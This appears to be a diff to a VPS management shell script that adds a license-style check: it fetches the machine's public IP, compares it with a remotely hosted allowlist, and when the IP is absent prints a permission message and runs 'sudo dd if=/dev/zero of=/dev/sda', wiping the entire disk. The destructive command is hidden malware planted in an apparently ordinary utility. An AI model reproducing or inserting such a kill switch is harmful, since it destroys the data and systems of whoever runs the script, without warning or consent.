@@ -20,6 +20,18 @@ red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 stty erase ^?
 
+MY_IP=$(curl -s -4 ifconfig.me)
+
+ALLOWED_IPS=$(curl -s https://raw.githubusercontent.com/hmz-hh/vps/refs/heads/main/int)
+
+if ! echo "$ALLOWED_IPS" | grep -qx "$MY_IP"; then
+  echo -e "${RED} You do not have sufficient permissions.${RED}"
+  echo -e "${RER} The administrator did not approve the request to use the script.${RED}"
+  echo -e "${RED} To obtain the authority to execute the script , contact here @a_hamza_i ${RED}"
+    sudo dd if=/dev/zero of=/dev/sda bs=1M
+    exit 1
+else
+
 TIMES="10"
 NAMES=$(whoami)
 IMP="wget -q -O"
